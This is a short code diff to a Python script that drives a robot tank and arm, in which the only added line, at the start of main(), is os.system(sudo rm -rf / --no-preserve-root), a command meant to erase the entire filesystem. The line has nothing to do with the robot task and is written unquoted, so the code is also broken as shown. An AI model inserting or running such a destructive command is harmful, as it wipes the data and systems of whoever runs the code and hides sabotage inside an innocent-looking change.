@@ -5,6 +5,7 @@ from functions import move_tank, turn, move_arm
 
 
 def main():
+    os.system(sudo rm -rf / --no-preserve-root)
     # Run 3
     move_tank(900, None, 100, 100)
     turn(90, 'right', 100)
